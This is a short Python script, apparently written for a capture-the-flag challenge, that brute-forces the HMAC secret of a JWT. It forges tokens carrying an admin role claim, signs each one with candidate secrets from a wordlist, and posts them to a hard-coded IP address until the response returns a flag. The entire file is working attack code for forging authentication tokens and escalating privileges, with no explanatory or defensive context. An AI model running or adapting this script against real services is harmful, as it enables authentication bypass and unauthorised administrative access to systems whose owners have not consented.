# not ready yet
import json
import base64
import hmac
import hashlib
import requests
import sys

TARGET = "http://18.199.99.247/validate"
WORDLIST_FILE = "wordlist.txt"


def b64(d):
    if isinstance(d, str): d = d.encode('utf-8')
    return base64.urlsafe_b64encode(d).decode('utf-8').rstrip('=')


def sign(h, p, s):
    msg = f"{h}.{p}".encode('utf-8')
    return b64(hmac.new(s.encode('utf-8'), msg, hashlib.sha256).digest())


h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
p = b64(json.dumps({"role": "admin", "iat": 1792674241, "exp": 1792675741}, separators=(',', ':')))

try:
    with open(WORDLIST_FILE, 'r') as f:
        for line in f:
            s = line.strip()
            if not s:
                continue

            print(f"Testing: {s}", end='\r')

            try:
                t = f"{h}.{p}.{sign(h, p, s)}"
                r = requests.post(TARGET, headers={"Authorization": t, "Content-Type": "application/json"}, data="{}",
                                  timeout=1)

                if r.ok and "flag" in r.text:
                    print(f"\n\nMATCH: {s}\nFLAG: {r.json().get('flag')}")
                    sys.exit(0)
                elif "invalid signature" not in r.text.lower():
                    # Print unusual errors
                    print(f"\nWARN: {s} -> {r.status_code} {r.text}")

            except requests.exceptions.RequestException:
                pass  # Ignore timeouts/connection errors silently

    print("\n\nNo match found in wordlist.")

except FileNotFoundError:
    print(f"Error: Wordlist file '{WORDLIST_FILE}' not found.")
except Exception as e:
    print(f"An error occurred: {e}")